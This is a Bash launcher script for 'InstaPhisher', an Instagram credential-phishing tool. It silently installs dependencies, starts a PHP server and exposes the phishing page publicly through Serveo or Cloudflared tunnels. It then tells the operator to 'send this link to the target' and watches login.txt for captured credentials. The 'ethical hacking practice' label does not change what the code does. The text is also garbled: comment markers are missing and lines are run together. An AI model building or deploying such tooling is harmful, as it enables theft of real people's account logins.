#!/bin/bash

Colors

RED='\033[1;31m' GRN='\033[1;32m' CYAN='\033[1;36m' YEL='\033[1;33m' NC='\033[0m'  # No Color

Clear screen

clear

Install dependencies silently

pkg install figlet toilet ruby php openssh git -y > /dev/null 2>&1 gem install lolcat > /dev/null 2>&1

Rainbow typing animation

rainbow_type() { text="$1" delay=${2:-0.03} COLORS=('\033[1;31m' '\033[1;33m' '\033[1;32m' '\033[1;36m' '\033[1;34m' '\033[1;35m') NC='\033[0m' color_index=0 for ((i=0; i<${#text}; i++)); do char="${text:$i:1}" echo -en "${COLORS[$color_index]}$char${NC}" sleep "$delay" ((color_index=(color_index+1)%${#COLORS[@]})) done echo "" }

Typing animation

type_effect() { text=$1 delay=${2:-0.07} for ((i=0; i<${#text}; i++)); do printf "%s" "${text:$i:1}" sleep "$delay" done echo "" }

Header

figlet -f slant "InstaPhisher" | lolcat rainbow_type "Instagram Phishing Tool for Ethical Hacking Practice" rainbow_type "Created by: SACHIN BADASRA" echo ""

Start localhost

start_localhost() { echo -e "${GRN}[+] Starting localhost server at http://127.0.0.1:8080 ...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${YEL}[!] Waiting for credentials... (Press CTRL + C to stop)${NC}" tail -f login.txt 2>/dev/null }

Start Serveo.net

start_serveo() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & sleep 1 echo -e "${GRN}[+] Starting Serveo tunnel...${NC}" ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 & sleep 2 SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log) if [[ $SERVEO_URL == serveo.net ]]; then echo -e "${GRN}[+] Phishing Page Live at: $SERVEO_URL${NC}" echo -e "${CYAN}[@] Send this link to the target${NC}" echo -e "${YEL}[!] Waiting for credentials... (Press CTRL + C to stop)${NC}" tail -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to get Serveo URL.${NC}" fi }

Start Cloudflared

start_cloudflared() { echo -e "${GRN}[+] Starting PHP server...${NC}" php -S 127.0.0.1:8080 > /dev/null 2>&1 & echo -e "${GRN}[+] Starting Cloudflared tunnel...${NC}" ./cloudflared tunnel --url http://localhost:8080 > cloudflared.log 2>&1 & sleep 4 URL=$(grep -o "https://[-0-9a-z]*.trycloudflare.com" cloudflared.log | head -n 1) if [[ $URL == trycloudflare.com ]]; then echo -e "${GRN}[+] Phishing Page Live at: $URL${NC}" echo -e "${YEL}[!] Waiting for credentials... (Press CTRL + C to stop)${NC}" tail -f login.txt 2>/dev/null else echo -e "${RED}[!] Failed to start Cloudflared tunnel.${NC}" fi }

Main menu

echo -e "${CYAN}Choose Port Forwarding Method:${NC}" echo "1) Localhost (same device/network)" echo "2) Serveo.net (public URL)" echo "3) Cloudflared (public URL)" read -p $'\n>> ' choice

case $choice in

1. start_localhost;;


2. start_serveo;;


3. start_cloudflared;; *) echo -e "${RED}[!] Invalid choice. Exiting.${NC}"; exit 1;; esac



